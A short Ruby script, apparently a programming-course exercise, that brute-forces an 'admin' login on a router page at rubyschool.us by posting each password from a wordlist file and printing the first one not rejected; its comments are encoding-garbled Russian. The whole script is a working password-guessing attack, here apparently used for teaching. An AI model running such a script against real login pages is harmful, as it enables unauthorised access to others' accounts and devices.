# encoding: cp866
# тїюф эр ёЄЁрэшЎє
# эрщЄш ярЁюы№

require 'net/http'
require 'uri'

def is_wrong_password? password
	uri = URI.parse 'http://rubyschool.us/router'
	response = Net::HTTP.post_form(uri, :login => "admin", :password => password).body
	response.include? "denied"
end

all_pass = File.open 'L18.passwords.txt', 'r'

while line = all_pass.gets
	line.strip!

        if is_wrong_password? line
		
	else
		puts "Pass: #{line}"
		all_pass.close
		exit
	end
end
